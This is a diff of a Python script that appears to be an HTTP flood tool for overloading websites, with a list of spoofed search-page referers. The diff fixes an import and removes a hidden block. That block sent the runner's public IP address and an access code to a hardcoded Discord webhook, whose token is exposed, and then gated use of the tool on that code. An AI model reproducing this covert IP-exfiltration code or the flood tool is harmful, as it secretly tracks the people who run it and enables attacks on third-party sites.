@@ -4,11 +4,10 @@ import socket
 import sys
 import os
 import time
-import request
+import requests
 import random
 import threading
 import base64 as b64
-from dhooks import Webhoook
 from types import MethodType
 import string
 
@@ -173,19 +172,6 @@ referers = [
 'http://filehippo.com/search?q=',
 'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
 'http://eu.battle.net/wow/en/search?q=']
-
-codes = random.randint(0,999) #Proses Code Random
-ip1 = request.get("https://api.ipify.org/") #Tracker IP VPS
-hook = Webhook("https://discord.com/api/webhooks/932254201025789964/tP9m01ZJC6zEVOgGsO3f1sNrcq8IgB6ArqlntO9oztoHg44_BE3lhnUBbJwJkttecBrn") #LINK WEBHOOK UNTUK SEND SEBUAH OBJEK
-hook.send(f"\nIP Address : {ip1}\nCode : {codes}\n") #GUNA NYA MENGIRIM KE LINK WEBHOOK
-passw = int(input("Enter Code : "))
-
-if passw == codes: # JIKA CODE BENAR
- print("Benar Code")
-
-else: # JIKA CODE SALAH ATAU BERBEDA DARI OBJEK CODES
- print("Salah Code")
- exit()
 
 print("")
 name = str(input('\033[1;33;40mInput Name > \033[0m'))
